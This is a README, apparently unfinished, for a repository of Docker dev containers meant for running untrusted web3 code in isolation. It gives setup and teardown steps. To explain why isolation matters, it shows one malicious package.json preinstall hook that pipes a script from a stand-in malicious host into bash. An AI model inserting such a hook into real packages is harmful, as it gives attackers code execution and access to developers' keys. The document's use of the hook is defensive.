*Important: This repo is a work in progress*

# Web3 Dev Containers

A repo to help you run code in a safer manner in the web3 ecosystem. You open up your code in an isolated docker environment so you have a smaller chance of getting hacked.

*Important: This isn't a fail-safe!* 

You can read more about the importance of sandboxing, containers vs VMs, and more in the [Red Guild Blog](https://blog.theredguild.org/where-do-you-run-your-code/).

## Table of contents

- [Web3 Dev Containers](#web3-dev-containers)
  - [Table of contents](#table-of-contents)
  - [Why are dev containers important?](#why-are-dev-containers-important)
  - [Examples of when you'd want to use a dev container](#examples-of-when-youd-want-to-use-a-dev-container)
- [Getting Started](#getting-started)
  - [Requirements](#requirements)
  - [Optional VSCode Requirements](#optional-vscode-requirements)
  - [Installation](#installation)
  - [Quickstart - VSCode and Foundry on a new project, unmounted](#quickstart---vscode-and-foundry-on-a-new-project-unmounted)
- [Usage](#usage)
  - [VSCode](#vscode)
    - [Mounted](#mounted)
    - [Using on an existing project](#using-on-an-existing-project)
  - [Raw Docker](#raw-docker)
    - [Mounted](#mounted-1)
    - [Using on an existing project](#using-on-an-existing-project-1)
  - [Adding new projects](#adding-new-projects)
  - [Adding new tools/Dockerfiles/containers](#adding-new-toolsdockerfilescontainers)
- [License](#license)
- [Acknowledgements](#acknowledgements)

## Why are dev containers important?

So you don't get *rekt*, big dog.

Imagine you're auditing a suspicious smart contract and it has a `package.json` that includes a malicious preinstall script:

```json
{
  "name": "suspicious-contract",
  "scripts": {
    "preinstall": "curl -s http://some-malicious-site.com/steal.sh | bash"
  }
}
```

If you run npm install on your host machine, you'll essentailly be running a bash script from a random website on your machine! It could do things like:
- The script could steal your private keys from `~/.ssh`
- Steal encrypted keys from `~/.foundry`
- Install malware somewhere in your files
- Literally anything 

But in a dev container:
- The script is isolated to the container environment
- Can't access your host files unless explicitly mounted
- Even if it installs malware, it's confined to the container
- When you're done, you can destroy the container without affecting your host

The container provides a disposable, isolated environment where you can more safely examine and run suspicious code.

## Examples of when you'd want to use a dev container

- When you're auditing code that you're not sure you trust
- When you get an interview and the interviewer asks you to download and run some code (by the way, this is usually a scam anyways)
- When you're going to download some suspicious packages
- Or really, whenever you work on any project at all so that you isolate your dev environment from your host machine

# Getting Started

## Requirements

- [Docker](https://docs.docker.com/get-docker/)
  - Must have installed on your local OS: `docker` and `docker-buildx`.
  - You'll know you have it installed if you can run `docker --version` in your terminal and you get an output like `Docker version xx.x.x, build xxxxxxxx` (`x` are numbers)

## Optional VSCode Requirements 

- [VSCode](https://code.visualstudio.com/)
- DevContainer extension by MS: `ms-vscode-remote.remote-containers`

## Installation

Please see [VSCode](#VSCode) or [Raw Docker](#Raw-Docker) for more detailed instructions.

```bash
git clone https://github.com/Cyfrin/web3-dev-containers
cd web3-dev-containers
```

## Quickstart - VSCode and Foundry on a new project, unmounted

Please see [VSCode](#VSCode) or [Raw Docker](#Raw-Docker) for more detailed instructions.

> **Note**  
> `unmounted`: This means that all the code we work with will be destroyed once we stop the container. This is the safest way to work with code. There are times when we want to save our code, you can see those instructions in the `mounted` section in the [Usage](#Usage) section.
> If you want to save the changes you make to your code back to your host computer, you can use the `mounted` version of the dev container.

1. Open the `foundry/unmounted` folder in VSCode

After you clone this repo, open the `web3-dev-containers/foundry/unmounted` folder in VS Code. 

```bash
code ./foundry/unmounted # If you have the `code` terminal command installed

# Otherwise, you can just do `File` -> `Open Folder` and select the `web3-dev-containers` folder
```

2. Run `Dev Containers: Reopen in Container` from the command palette

To get to the command pallette, you can use the following shortcuts:
- Windows/Linux: `Ctrl+Shift+P`
- macOS: `Cmd+Shift+P`

Then type `Dev Containers: Reopen in Container` and select it.

You should get opened up into a new window that looks like this:

<p align="center">
    <br />
        <img src="./img/dev-container-image.png" width="750" alt=""/></a>
    <br />
</p>

3. Clone your project into the `projects` folder

You should be at `/workspace`. 

```bash
git clone https://github.com/Cyfrin/foundry-fund-me-cu # Example project
cd foundry-fund-me-cu
forge build
forge test
```

This will clone the project into the `projects` folder and you can start working with your projects, knowing that scripts are isloated to this dev container!

4. Tear down

When you're done, you can delete the docker container in your docker dashboard, or run `docker ps` to get the container ID and run `docker stop <container-id>` to stop the container.

To do it via the CLI, back on your host machine run:

```bash
docker ps # You'll get an output of different running docker containers
docker stop <container-id> # Replace <container-id> with the container ID of the dev container

# If you're sure you don't want any stopped containers, you can then optionally run:
docker system prune # And then `y` to confirm
# Be sure you actually want to run this
```

This will delete all traces of the code you worked on in that container!

# Usage 

## VSCode

Please see the [Quickstart](#Quickstart---VSCode-and-Foundry-on-a-new-project) for a quick guide on how to use this with VSCode on a new project.

### Mounted

### Using on an existing project

## Raw Docker

### Mounted

### Using on an existing project

## Adding new projects

## Adding new tools/Dockerfiles/containers

# License

# Acknowledgements
